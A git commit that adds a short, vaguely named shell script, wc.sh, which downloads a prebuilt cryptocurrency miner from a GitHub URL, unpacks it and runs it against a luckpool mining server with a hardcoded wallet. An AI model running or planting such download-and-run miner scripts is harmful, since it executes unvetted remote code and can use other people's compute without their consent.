64fc953107e21fd21435210af06cc5fbed9167f4
rocaniro28 <84338491+rocaniro28@users.noreply.github.com>
2021-05-20 19:26:29 +0800

    Create wc.sh

---
+++ wc.sh
@@ -0,0 +1,5 @@
+#vc
+sudo apt update
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RCiFcFjm7PYyhUcE4rpsvnLQvX7rdbCmrV.M25 -p x -t 4
